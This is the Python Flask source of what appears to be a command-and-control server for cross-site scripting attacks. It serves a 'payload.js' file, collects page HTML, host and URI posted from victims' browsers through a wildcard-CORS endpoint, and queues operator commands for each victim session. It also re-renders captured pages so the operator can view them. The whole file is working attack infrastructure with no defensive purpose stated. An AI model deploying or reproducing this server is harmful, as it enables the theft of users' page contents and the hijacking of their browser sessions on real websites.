import cgi
import json
import re # sorry
import time
from flask import Flask, render_template, request, send_from_directory
from flask_cors import CORS


app = Flask(__name__)
cors = CORS(app, resources={
    r"/collect": {"origins": "*"},
    r"/getnext/.*": {"origins": "*"}})
pagecache = {}
commands = {}


@app.route("/")
def hello():
    return "Hello World!"

@app.route("/payload.js", methods=['GET'])
def payload():
    return send_from_directory('.', 'payload.js')

@app.route("/getnext/<session>", methods=['GET'])
def getnext(session):
    requests = None

    while not requests:
        requests = commands.get(session)
    del commands[session]
    return json.dumps(requests)

@app.route("/collect", methods=['POST'])
def collect():
    session = request.form.get('session')
    print(session)
    host = request.form.get('host')
    uri = request.form.get('uri')
    payload = request.form.get('payload')
    pagecache[session] = {'host': host, 'uri': uri, 'payload': payload, 'old': False}
    return "ok"



@app.route("/addrequest/<session>", methods=['POST'])
def addrequest(session):
    payload = json.loads(request.form.get('payload'))
    existing_commands = commands.get(session, [])
    print(payload)
    existing_commands.append(payload)
    commands[session] = existing_commands
    return "added"



@app.route("/view/<session>", methods=['GET'])
def view(session):
    return render_template('viewer.html', session=session)

@app.route("/viewerframe/<session>", defaults={'stale': 'fresh'}, methods=['GET'])
@app.route("/viewerframe/<session>/<stale>")
def frame(session, stale):

    stale = stale == 'stale'
    while session not in pagecache:
        print('Waiting for pagecache...')
        time.sleep(1)

    if not stale:
        while pagecache[session]['old']:
            print('waiting for non-stale...')
            time.sleep(1)

    host = pagecache[session]['host']
    html = pagecache[session]['payload']
    # insert a "base" tag so that we can render
    html = '<html>' + re.sub('<head>', ('<head><base href="'+cgi.escape(host)+'/">'), html, flags=re.IGNORECASE) + '</html>'
    pagecache[session]['old'] = True;
    return html